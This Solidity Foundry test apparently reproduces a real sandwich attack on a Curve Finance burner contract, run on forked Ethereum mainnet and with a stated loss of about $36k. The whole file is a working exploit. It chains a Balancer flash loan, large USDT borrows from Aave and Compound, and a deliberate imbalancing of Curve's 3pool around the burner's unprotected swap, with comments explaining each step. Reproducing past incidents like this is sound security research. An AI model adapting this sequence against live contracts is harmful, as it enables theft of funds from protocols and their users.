// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~$36k USD$
// Attacker : https://etherscan.io/address/0xccc526e2433db1eebb9cbf6acd7f03a19408278c
// Attack Contract : https://etherscan.io/address/0x915dff6707bea63daea1b41aa5d37353229066ba
// Vulnerable Contract : https://etherscan.io/address/0x786b374b5eef874279f4b7b4de16940e57301a58
// Attack Tx : https://etherscan.io/tx/0xd493c73397952049644c531309df3dd4134bf3db1e64eb6f0b68b016ee0bffde

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x786b374b5eef874279f4b7b4de16940e57301a58#code

// @Analysis
// Post-mortem : https://medium.com/@Hypernative/exotic-culinary-hypernative-systems-caught-a-unique-sandwich-attack-against-curve-finance-6d58c32e436b

interface ICurveBurner {
    function execute() external;
}

interface ICurve {
    function add_liquidity(uint256[3] memory amounts, uint256 min_mint_amount) external;

    function remove_liquidity_imbalance(uint256[3] memory amounts, uint256 max_burn_amount) external;

    function remove_liquidity_one_coin(uint256 token_amount, int128 i, uint256 min_amount) external;
}

contract ContractTest is Test {
    ICurveBurner CurveBurner = ICurveBurner(0x786B374B5eef874279f4B7b4de16940e57301A58);
    IERC20 wstETH = IERC20(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
    IWETH WETH = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    IERC20 USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 LP = IERC20(0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490);
    crETH cETH = crETH(0x4Ddc2D193948926D02f9B1fE9e1daa0718270ED5);
    ICurve Curve3POOL = ICurve(0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7);
    ICErc20Delegate cUSDT = ICErc20Delegate(0xf650C3d88D12dB855b8bf7D11Be6C55A4e07dCC9);
    ICointroller Cointroller = ICointroller(0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B);
    IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IAaveFlashloan aaveV2 = IAaveFlashloan(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
    IAaveFlashloan aaveV3 = IAaveFlashloan(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);

    function setUp() public {
        vm.createSelectFork("mainnet", 17_823_542);
        vm.label(address(WETH), "WETH");
        vm.label(address(USDC), "USDC");
        vm.label(address(CurveBurner), "CurveBurner");
        vm.label(address(Curve3POOL), "Curve3POOL");
        vm.label(address(DAI), "DAI");
        vm.label(address(wstETH), "wstETH");
        vm.label(address(USDT), "USDT");
        vm.label(address(LP), "LP");
        vm.label(address(cETH), "cETH");
        vm.label(address(cUSDT), "cUSDT");
        vm.label(address(Balancer), "Balancer");
        vm.label(address(aaveV2), "aaveV2");
        vm.label(address(aaveV3), "aaveV3");
    }

    function testExploit() external {
        deal(address(this), 0);

        address[] memory tokens = new address[](3);
        tokens[0] = address(wstETH);
        tokens[1] = address(WETH);
        tokens[2] = address(USDT);
        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 35_986 ether;
        amounts[1] = 79_768 ether;
        amounts[2] = 10_744_911 * 1e6;
        bytes memory userData = "";
        Balancer.flashLoan(address(this), tokens, amounts, userData);

        emit log_named_decimal_uint(
            "Attacker USDT balance after exploit", USDT.balanceOf(address(this)), USDT.decimals()
        );
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        wstETH.approve(address(aaveV3), wstETH.balanceOf(address(this)));
        aaveV3.supply(address(wstETH), wstETH.balanceOf(address(this)), address(this), 0); // deposit wstETH to aaveV3
        aaveV3.borrow(address(USDT), 40_000_000 * 1e6, 2, 0, address(this)); // borrow USDT from aaveV3

        WETH.approve(address(aaveV2), WETH.balanceOf(address(this)));
        aaveV2.deposit(address(WETH), 50_000 ether, address(this), 0); // deposit WETH to aaveV2
        aaveV2.borrow(address(USDT), 65_000_000 * 1e6, 2, 0, address(this)); // borrow USDT from aaveV2

        WETH.withdraw(29_000 ether);

        address[] memory cTokens = new address[](2);
        cTokens[0] = address(cETH);
        cTokens[1] = address(cUSDT);
        Cointroller.enterMarkets(cTokens); // enter cTokens market
        cETH.mint{value: 29_000 ether}();
        cUSDT.borrow(40_000_000 * 1e6); // borrow USDT from cUSDT

        LP.approve(address(Curve3POOL), type(uint256).max);
        USDC.approve(address(Curve3POOL), type(uint256).max);
        DAI.approve(address(Curve3POOL), type(uint256).max);
        TransferHelper.safeApprove(address(USDT), address(Curve3POOL), type(uint256).max);
        TransferHelper.safeApprove(address(USDT), address(cUSDT), type(uint256).max);
        TransferHelper.safeApprove(address(USDT), address(aaveV2), type(uint256).max);
        TransferHelper.safeApprove(address(USDT), address(aaveV3), type(uint256).max);

        uint256[3] memory amount;
        amount[0] = 0;
        amount[1] = 0;
        amount[2] = USDT.balanceOf(address(this));
        Curve3POOL.add_liquidity(amount, 1); // deposit USDT to Curve3POOL

        amount[0] = DAI.balanceOf(address(Curve3POOL)) * 978 / 1000;
        amount[1] = USDC.balanceOf(address(Curve3POOL)) * 978 / 1000;
        amount[2] = 0;
        Curve3POOL.remove_liquidity_imbalance(amount, LP.balanceOf(address(this))); // withdraw DAI and USDC from Curve3POOL

        CurveBurner.execute(); // add only USDT liquidity to Curve3POOL -> swap USDT to DAI and USDC without slippage protection

        amount[0] = DAI.balanceOf(address(this));
        amount[1] = USDC.balanceOf(address(this));
        amount[2] = 0;
        Curve3POOL.add_liquidity(amount, 1); // deposit DAI and USDC to Curve3POOL

        Curve3POOL.remove_liquidity_one_coin(LP.balanceOf(address(this)), 2, 1); // withdraw USDT from Curve3POOL

        cUSDT.repayBorrow(cUSDT.borrowBalanceCurrent(address(this))); // repay USDT to cUSDT
        cETH.redeemUnderlying(29_000 ether); // withdraw ETH from cETH

        WETH.deposit{value: 29_000 ether}();
        aaveV2.repay(address(USDT), 65_000_000 * 1e6, 2, address(this)); // repay USDT to aaveV2
        aaveV2.withdraw(address(WETH), 50_000 ether, address(this)); // withdraw WETH from aaveV2

        aaveV3.repay(address(USDT), 40_000_000 * 1e6, 2, address(this)); // repay USDT to aaveV3
        aaveV3.withdraw(address(wstETH), type(uint256).max, address(this)); // withdraw wstETH from aaveV3

        IERC20(tokens[0]).transfer(msg.sender, amounts[0] + feeAmounts[0]);
        IERC20(tokens[1]).transfer(msg.sender, amounts[1] + feeAmounts[1]);
        TransferHelper.safeTransfer(tokens[2], msg.sender, amounts[2] + feeAmounts[2]);
    }

    receive() external payable {}
}
